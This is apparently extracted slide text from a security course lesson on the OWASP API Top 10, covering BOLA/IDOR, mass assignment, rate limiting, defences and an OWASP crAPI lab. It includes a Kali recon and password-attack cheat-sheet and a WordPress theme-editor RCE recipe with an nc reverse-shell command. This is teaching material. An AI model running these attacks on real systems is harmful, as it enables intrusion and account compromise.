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10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REST/GraphQL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API Security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&amp;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resource consumption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crAPI Raid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Web half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XSS, auth/IDOR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concentrate all of these — and add their own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APIs are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Machine-to-machine, no browser to "protect"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IDs everywhere → ripe for IDOR/BOLA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can send any field →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the OWASP API Security Top 10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(API1) — the #1 API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/api/vehicle/1001/location   → yours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/api/vehicle/1002/location   → someone else's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Object Level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IDOR, at API scale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assignment (API3)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/api/user  { "name":"x", "role":"admin", "credit":9999 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sets fields the server blindly binds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Privilege/credit escalation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of the Top 10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API2 — broken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API4 — unrestricted resource consumption (no rate limit)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API6 — unrestricted access to sensitive business flows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data exposure (over-returning fields)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Object-level authorization on every request (check ownership)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request schemas — bind only intended fields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/ quotas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only needed fields (DTOs)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(OpenAPI / GraphQL types)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Complementary: black-box recon cheat-sheet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only have an IP/URL (Kali):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810512"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 303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netdiscover                 # find hosts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nmap -sV target             # ports/services (80/443?)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nikto -h http://target      # web server issues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dirb  http://target         # hidden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wpscan --url http://target  # if WordPress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hydra ... http-post-form    # password attack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feature abused as backdoor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404-template RCE → reverse shell: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Appearance → Theme Editor → 404 Template → insert exec(...)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trigger by visiting any non-existent page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nc -lvp 34567 -e /bin/bash   # attacker gets a shell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17296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admin features become RCE without strict authz + integrity checks.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🥷 Game — crAPI Raid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https://github.com/OWASP/crAPI.git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crAPI/deploy/docker &amp;&amp; docker compose up -d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2768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2768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BOLA: read another user's vehicle/order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340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340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assignment: set a forbidden field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1912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1912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consumption: hit an unthrottled endpoint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484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484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authz + schema validation + rate limiting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mapped to the API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(authz checks, schemas, limits)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exploits now fail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BOLA/IDOR is the dominant API bug — check ownership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only fields you intend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and throttle everything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Memory-safety &amp; exploitation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10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